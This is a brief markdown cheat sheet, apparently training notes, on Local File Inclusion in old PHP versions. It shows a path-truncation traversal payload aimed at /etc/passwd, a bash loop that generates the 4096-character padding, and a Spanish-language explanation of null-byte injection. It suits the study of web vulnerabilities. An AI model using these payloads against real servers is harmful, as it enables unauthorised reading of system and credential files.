<h1 align="center">Local File Inclusion (LFI) OLD PHP Version 5.3/5.4 Cheat Sheet</h1>

<p align="center">
  They only work with PHP versions prior to 5.3/5.4
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Web_Security-111827?style=for-the-badge&logo=owasp&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/OffSec-Techniques-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/LFI-Local_File_Inclusion-111827?style=for-the-badge&logoColor=00FFFF">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

> In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored.

## Path Truncation

```
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```

We don't have to manually type ./ 2048 times (a total of 4096 characters).

```
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```


## Null Bytes

> Las versiones de PHP anteriores a la 5.5 eran vulnerables a la inyección de bytes nulos (null byte injection), lo que significa que añadir un byte nulo (%00) al final de la cadena la terminaría y no consideraría nada después de él. Esto se debe a cómo se almacenan las cadenas en la memoria de bajo nivel, donde las cadenas en memoria deben usar un byte nulo para indicar el final de la cadena, como se ve en lenguajes como Assembly, C o C++.

